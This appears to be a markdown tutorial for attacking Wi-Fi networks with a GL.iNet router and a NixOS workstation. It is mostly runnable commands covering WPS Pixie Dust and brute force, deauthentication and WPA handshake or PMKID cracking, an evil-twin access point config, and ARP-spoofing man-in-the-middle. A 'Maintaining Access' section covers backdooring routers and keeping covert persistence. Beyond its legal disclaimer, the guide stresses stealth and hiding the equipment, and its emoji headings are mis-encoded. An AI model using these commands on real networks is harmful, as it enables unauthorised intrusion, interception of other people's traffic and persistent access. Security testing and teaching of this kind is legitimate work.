# Wireless Pentesting Guide - Offline Edition
## GL.iNet Router + NixOS Workstation

**âš ï¸ LEGAL DISCLAIMER**: This guide is for educational purposes and authorized security testing only. Only test on networks you own or have explicit written permission to test. Unauthorized access to computer networks is illegal.

---

## Table of Contents
1. [Prerequisites & Setup](#prerequisites--setup)
2. [Attack Methods (Ordered by Success Rate)](#attack-methods)
3. [Post-Exploitation](#post-exploitation)
4. [Maintaining Access](#maintaining-access)
5. [Troubleshooting](#troubleshooting)

---

## Prerequisites & Setup

### NixOS Package Installation

Add these packages to your NixOS configuration:

```nix
environment.systemPackages = with pkgs; [
  # Core wireless tools
  aircrack-ng
  wireshark
  tcpdump
  
  # Advanced tools
  reaver
  bully
  pixiewps
  hcxtools
  hcxdumptool
  
  # Cracking tools
  hashcat
  john
  
  # Network tools
  macchanger
  mdk4
  hostapd
  dnsmasq
  
  # Optional but useful
  kismet
  wifite
  fluxion
  
  # Wordlists
  wordlists  # includes rockyou.txt
];
```

### GL.iNet Router Setup

1. **Enable Monitor Mode on GL.iNet:**
```bash
# SSH into your GL.iNet router
ssh root@192.168.8.1

# Stop network manager
/etc/init.d/network stop

# Put interface in monitor mode (usually wlan0 or wlan1)
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

# Verify monitor mode
iwconfig wlan0
```

2. **Alternative: Use airmon-ng (if available on router):**
```bash
airmon-ng check kill
airmon-ng start wlan0
```

### Workstation Setup

```bash
# Check wireless interface
ip link show

# If using USB adapter, ensure it's in monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Change MAC address (optional but recommended)
sudo macchanger -r wlan0
```

---

## Attack Methods

### ðŸ¥‡ Method 1: WPS PIN Attack (Highest Success Rate: ~80%)

**Why it works:** Many routers have WPS enabled with vulnerable implementations.

#### Step 1: Scan for WPS-enabled networks
```bash
# Using wash (part of reaver)
sudo wash -i wlan0mon

# Look for:
# - WPS Locked: No
# - WPS Version: 1.0 or 2.0
```

#### Step 2: Pixie Dust Attack (Fast - Minutes)
```bash
# This exploits weak random number generation
sudo reaver -i wlan0mon -b [TARGET_BSSID] -c [CHANNEL] -K -vv

# Alternative with bully
sudo bully wlan0mon -b [TARGET_BSSID] -c [CHANNEL] -d -v 3
```

#### Step 3: Online Brute Force (Slow - Hours/Days)
```bash
# If Pixie Dust fails, try brute force
sudo reaver -i wlan0mon -b [TARGET_BSSID] -c [CHANNEL] -vv -L -N -d 15 -T 0.5 -r 3:15

# Options explained:
# -L = Ignore locked state
# -N = Don't send NACK messages
# -d 15 = 15 second delay between attempts
# -T 0.5 = Timeout period
# -r 3:15 = Sleep 15 seconds after 3 failures
```

**Success Indicators:**
- Router doesn't implement rate limiting
- WPS not locked after failed attempts
- Router doesn't have anti-brute force protection

---

### ðŸ¥ˆ Method 2: WPA/WPA2 Handshake Capture + Offline Cracking (Success: ~60%)

**Why it works:** Weak passwords are common, and offline cracking is undetectable.

#### Step 1: Scan for targets
```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Focus on specific channel
sudo airodump-ng wlan0mon -c [CHANNEL] --bssid [TARGET_BSSID] -w capture

# Look for:
# - High PWR (signal strength)
# - Active clients (easier to capture handshake)
# - WPA2 encryption
```

#### Step 2: Capture handshake

**Option A: Wait for natural reconnection**
```bash
sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w handshake wlan0mon

# Wait for "WPA handshake" message in top-right
# This can take minutes to hours
```

**Option B: Force deauthentication (faster)**
```bash
# Terminal 1: Capture
sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w handshake wlan0mon

# Terminal 2: Deauth attack
sudo aireplay-ng --deauth 10 -a [TARGET_BSSID] wlan0mon

# Or target specific client
sudo aireplay-ng --deauth 10 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon
```

**Option C: Using hcxdumptool (modern method)**
```bash
# Capture with automatic deauth
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcapng
```

#### Step 3: Verify handshake capture
```bash
# Using aircrack-ng
aircrack-ng handshake-01.cap

# Should show "1 handshake" for target BSSID
```

#### Step 4: Crack the handshake

**Option A: Dictionary attack (fastest)**
```bash
# Using aircrack-ng
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt

# Using hashcat (GPU acceleration - MUCH faster)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Hashcat with rules for better coverage
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Option B: Generate custom wordlist**
```bash
# Using crunch for pattern-based passwords
crunch 8 12 0123456789 -o numbers.txt

# Common patterns (phone numbers, dates, etc.)
crunch 10 10 0123456789 -t @@@@@@@@%% -o phone_patterns.txt

# Using John the Ripper for mangling
john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout > mangled.txt
hashcat -m 22000 hash.hc22000 mangled.txt
```

**Option C: Mask attack (if you know password pattern)**
```bash
# Example: 8 chars, starts with capital, ends with 2 digits
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?d?d

# Mask attack characters:
# ?l = lowercase
# ?u = uppercase
# ?d = digit
# ?s = special
# ?a = all
```

**Wordlist Locations on NixOS:**
```bash
# RockyYou (most common)
/run/current-system/sw/share/wordlists/rockyou.txt

# Or if using wordlists package
ls /nix/store/*-wordlists-*/share/wordlists/
```

---

### ðŸ¥‰ Method 3: PMKID Attack (Success: ~50%)

**Why it works:** Doesn't require clients, only router interaction. Works on some WPA2 routers.

#### Step 1: Capture PMKID
```bash
# Using hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=15

# Let it run for 5-10 minutes
# Press Ctrl+C when done
```

#### Step 2: Convert and verify
```bash
# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Check if PMKID was captured
cat pmkid.hc22000
```

#### Step 3: Crack
```bash
# Same as handshake cracking
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Advantages:**
- No clients needed
- Stealthier (no deauth packets)
- Faster capture

**Disadvantages:**
- Not all routers support PMKID
- Still requires weak password

---

### Method 4: Evil Twin Attack (Success: ~40%)

**Why it works:** Social engineering - users connect to fake AP.

#### Step 1: Gather target information
```bash
sudo airodump-ng wlan0mon

# Note:
# - ESSID (network name)
# - BSSID (MAC address)
# - Channel
# - Encryption type
```

#### Step 2: Create fake AP

**Using Fluxion (automated):**
```bash
sudo fluxion

# Follow prompts:
# 1. Select interface
# 2. Select target network
# 3. Choose attack (Captive Portal)
# 4. Select handshake capture method
# 5. Wait for victim to enter password
```

**Manual method with hostapd:**

Create `/tmp/hostapd.conf`:
```conf
interface=wlan0mon
driver=nl80211
ssid=[TARGET_ESSID]
hw_mode=g
channel=[TARGET_CHANNEL]
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=temporarypass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

```bash
# Start fake AP
sudo hostapd /tmp/hostapd.conf

# In another terminal, deauth real clients
sudo aireplay-ng --deauth 0 -a [REAL_BSSID] wlan0mon
```

#### Step 3: Captive portal (optional)
```bash
# Setup DHCP
sudo dnsmasq -C /tmp/dnsmasq.conf -d

# Redirect all traffic to captive portal
# (Requires web server with fake login page)
```

**Success factors:**
- Stronger signal than real AP
- Convincing captive portal
- Users not paying attention

---

### Method 5: WEP Cracking (Success: ~95% if WEP is used)

**Why it works:** WEP is fundamentally broken. However, WEP is rare nowadays.

#### Step 1: Capture IVs
```bash
sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w wep wlan0mon

# Need ~40,000-85,000 IVs for 64-bit WEP
# Need ~100,000+ IVs for 128-bit WEP
```

#### Step 2: Speed up with packet injection
```bash
# Test injection
sudo aireplay-ng --test wlan0mon -a [TARGET_BSSID]

# Fake authentication
sudo aireplay-ng --fakeauth 0 -a [TARGET_BSSID] wlan0mon

# ARP replay attack (generates traffic)
sudo aireplay-ng --arpreplay -b [TARGET_BSSID] wlan0mon
```

#### Step 3: Crack
```bash
# Once you have enough IVs
aircrack-ng wep-01.cap

# Usually cracks in seconds
```

---

### Method 6: WPA3 Attacks (Success: ~20%)

**Why it works:** WPA3 is newer and more secure, but some implementations have vulnerabilities.

#### Dragonblood Attack (CVE-2019-13377)
```bash
# Check if vulnerable
sudo wpa_supplicant -i wlan0mon -c dragonblood_test.conf

# Requires specific vulnerable firmware
# Success rate is low on updated routers
```

#### Downgrade Attack
```bash
# Try to force WPA3 to WPA2 transition mode
# Then use standard WPA2 attacks

# Using hostapd-wpe or similar tools
```

---

### Method 7: Router Exploitation (Success: Varies)

**Default credentials:**
```bash
# Common router defaults
admin:admin
admin:password
admin:[blank]
root:root
admin:1234

# Try web interface
# Try SSH/Telnet if exposed
```

**Known vulnerabilities:**
```bash
# Search for router model exploits
searchsploit [ROUTER_MODEL]

# Check for:
# - Default WPS PIN
# - Firmware vulnerabilities
# - UPnP exploits
```

---

## Post-Exploitation

### Once you have the password:

#### 1. Connect to network
```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Connect using wpa_supplicant
sudo wpa_passphrase "SSID" "password" > /tmp/wpa.conf
sudo wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf
sudo dhclient wlan0
```

#### 2. Network reconnaissance
```bash
# Scan network
sudo nmap -sn 192.168.1.0/24

# Detailed scan of router
sudo nmap -sV -sC -p- [ROUTER_IP]

# Check for open shares
sudo nmap -p 445 --script smb-enum-shares 192.168.1.0/24
```

#### 3. Man-in-the-Middle
```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoofing
sudo arpspoof -i wlan0 -t [TARGET_IP] [GATEWAY_IP]
sudo arpspoof -i wlan0 -t [GATEWAY_IP] [TARGET_IP]

# Capture traffic
sudo wireshark -i wlan0
```

#### 4. DNS spoofing
```bash
# Using ettercap
sudo ettercap -T -q -i wlan0 -M arp:remote /[GATEWAY_IP]// /[TARGET_IP]//

# Or using bettercap
sudo bettercap -iface wlan0
```

---

## Maintaining Access

### 1. Backdoor the router

**If you have admin access:**
```bash
# Add SSH key
ssh-copy-id root@[ROUTER_IP]

# Or add cron job for reverse shell
# (Requires router shell access)
```

### 2. Rogue AP persistence
```bash
# Create hidden network with same credentials
# Users might auto-connect when in range

# Using hostapd with hidden SSID
ignore_broadcast_ssid=1
```

### 3. Client-side persistence
```bash
# If you compromised a client device
# Install persistent backdoor
# (Beyond scope of wireless pentesting)
```

### 4. Monitor for password changes
```bash
# Periodically test credentials
# Set up alert if connection fails
```

---

## Troubleshooting

### Monitor mode issues
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Manually set monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Check mode
iwconfig wlan0
```

### No handshake captured
```bash
# Increase deauth packets
sudo aireplay-ng --deauth 50 -a [BSSID] wlan0mon

# Try different deauth methods
sudo mdk4 wlan0mon d -c [CHANNEL] -b [BSSID]

# Ensure you're on correct channel
sudo iwconfig wlan0mon channel [CHANNEL]
```

### Hashcat not using GPU
```bash
# Check GPU detection
hashcat -I

# Install OpenCL/CUDA drivers for NixOS
# Add to configuration.nix:
hardware.opengl.enable = true;
hardware.nvidia.package = config.boot.kernelPackages.nvidiaPackages.stable;
```

### Weak signal
```bash
# Use external antenna
# Get closer to target
# Use GL.iNet router as repeater/bridge
```

---

## Offline Wordlist Generation

Since you don't have internet access:

### 1. Generate custom wordlists
```bash
# Numbers only (PINs, phone numbers)
crunch 8 8 0123456789 -o numbers8.txt

# Common patterns
crunch 8 12 -t @@@@@@%% -o common_pattern.txt

# Dates (DDMMYYYY, MMDDYYYY)
crunch 8 8 0123456789 -t @@@@%%%% -o dates.txt
```

### 2. Combine existing wordlists
```bash
# Merge multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Add common suffixes
john --wordlist=base.txt --rules --stdout > enhanced.txt
```

### 3. Extract from local files
```bash
# Extract words from documents
strings /path/to/documents/* | sort -u > custom.txt

# Extract from system
cat /usr/share/dict/words > dictionary.txt
```

---

## GL.iNet Specific Tips

### 1. Dual-band usage
```bash
# Use 2.4GHz for monitoring (better range)
# Use 5GHz for connection (less interference)

# Check available interfaces
iw dev
```

### 2. Router as repeater
```bash
# Connect GL.iNet to target network
# Use workstation to attack through router
# Provides better signal and positioning
```

### 3. Portable setup
```bash
# GL.iNet runs on battery
# Perfect for mobile pentesting
# Can be hidden easily
```

---

## Success Rate Summary

| Method | Success Rate | Time Required | Skill Level |
|--------|-------------|---------------|-------------|
| WPS PIN (Pixie Dust) | 80% | Minutes | Beginner |
| WEP Cracking | 95% | Minutes | Beginner |
| WPA2 Handshake (weak pass) | 60% | Hours-Days | Intermediate |
| PMKID Attack | 50% | Hours-Days | Intermediate |
| Evil Twin | 40% | Hours | Advanced |
| WPA3 Attacks | 20% | Days | Advanced |
| Router Exploitation | Varies | Varies | Advanced |

---

## Best Practices

1. **Always get written permission** before testing
2. **Document everything** - screenshots, commands, results
3. **Use strong passwords** on your own networks after testing
4. **Keep tools updated** - even offline, update when possible
5. **Practice on your own network** first
6. **Respect privacy** - don't capture/store personal data
7. **Report vulnerabilities** responsibly

---

## Quick Reference Commands

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Scan networks
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c [CH] --bssid [BSSID] -w capture wlan0mon

# Deauth
sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon

# Crack with aircrack
aircrack-ng capture-01.cap -w wordlist.txt

# Crack with hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt

# WPS attack
sudo reaver -i wlan0mon -b [BSSID] -c [CH] -K -vv

# Stop monitor mode
sudo airmon-ng stop wlan0mon
```

---

## Additional Resources (for when you have internet)

- Aircrack-ng documentation
- Hashcat wiki
- Wireless pentesting courses (Offensive Security, eLearnSecurity)
- Router vulnerability databases
- Wireless security research papers

---

**Remember: With great power comes great responsibility. Use these techniques ethically and legally.**
